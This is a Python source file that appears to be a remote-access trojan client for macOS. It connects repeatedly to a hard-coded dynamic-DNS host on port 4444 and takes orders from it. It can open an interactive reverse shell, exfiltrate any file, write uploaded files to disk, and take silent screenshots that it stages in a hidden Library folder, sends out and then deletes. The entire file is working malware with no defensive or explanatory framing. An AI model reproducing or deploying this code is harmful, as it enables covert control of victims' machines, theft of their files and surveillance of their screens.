import socket
import subprocess
import os
import time

HOST = "sysadmin.ddns.net"
PORT = 4444


def start_shell(port):
    try:
        soc = socket.socket()
        soc.connect((HOST,port))
        subprocess.Popen(["/bin/sh","-i"],start_new_session=True,stdin=soc.fileno(),stdout=soc.fileno(),stderr=soc.fileno())
    except:
        return



def take_file(path,size):
    try:
        size = int(size)
        file = open(path,"wb")
        client.sendall("OK".encode())
        acc = 0
        data = client.recv(1024)
        acc += len(data)
        while data:
            file.write(data)
            if acc >= size:
                break
            data = client.recv(1024)
            acc += len(data)
        file.close()
    except:
        client.sendall("FAILED".encode())

def give_file(path):
    try:
        file = open(path,"rb")
        size = str(os.stat(path).st_size)
        client.sendall(size.encode())
        _ = client.recv(1024)
        data = file.read(1024)
        while data:
            client.sendall(data)
            data = file.read(1024)
        file.close()
    except:
        client.sendall("FAILED".encode())       


def send_screen():
    try:
        home = os.path.expanduser("~")
        dest = os.path.join(home,"Library",".system","a.jpg")
        os.system("screencapture -x " + dest)
        file_size = str(os.stat(dest).st_size)
        client.sendall(file_size.encode())
        _ = client.recv(1024)
        file = open(dest,"rb")
        data = file.read(1024) 
        while data:
            client.sendall(data)
            data = file.read(1024)
        file.close()
        os.system("rm "+dest)
    except:
        client.sendall("FAILED".encode()) 

while True:
    global client
    try:
        client = socket.socket()
        client.connect((HOST,PORT))
        client.sendall(socket.gethostname().encode())
        data = client.recv(1024)
        while data.decode("utf-8").strip() != "":
            cmd = data.decode("utf-8").strip().split("\n")
            if cmd[0] == "SHELL":
                start_shell(int(cmd[1]))
            elif cmd[0] == "GIVE":
                give_file(cmd[1])
            elif cmd[0] == "TAKE":
                take_file(cmd[1],cmd[2])
            elif cmd[0] == "SCREEN":
                send_screen()
            elif cmd[0] == "PING":
                client.sendall("ACK".encode())
            data = client.recv(1024)

    except:
        time.sleep(3)
        print("Failed")